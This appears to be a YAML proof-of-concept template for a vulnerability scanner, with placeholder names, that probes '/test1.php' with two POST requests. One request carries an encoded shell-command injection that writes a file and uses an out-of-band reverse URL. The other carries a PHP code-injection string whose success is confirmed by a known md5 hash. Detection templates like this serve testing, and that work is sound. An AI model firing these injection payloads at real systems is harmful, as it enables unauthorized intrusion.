id: poc-yaml-example-com

set:
  reverse: newReverse()
  reverseURL: reverse.url
  reverseURLHost: reverse.url.host
  reverseDomain: reverse.domain
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
  referer: request.url
  host: request.url.host
  fileName: randomLowercase(4) + ".txt"
  content: randomLowercase(8)
  requestType: request.content_type

payloads: 
  payloads:
    abc: urlencode(base64("`echo " + content + " > " + fileName + "`"))
rules:
  r1:
    request:
      method: POST
      path: "/test1.php"
      headers:
        Referer: '{{referer}}'
        Domain: '{{host}}'
        Reverse: '{{reverseURL}}'
      body: "{{abc}}.ASPX"
    expression: |
      reverse.wait(3)
    output:
      search: '"(?P<home>.+?).ASPX".bsubmatch(response.body)'
      home: search["home"]

  r2:
    request:
      method: POST
      path: "/test1.php"
      body: |
        id=';echo(md5(123));//&csrftoken={{home}}
    expression: |
      response.status == 200 && response.body.bcontains(b'202cb962ac59075b964b07152d234b70')
expression: r1() || r2()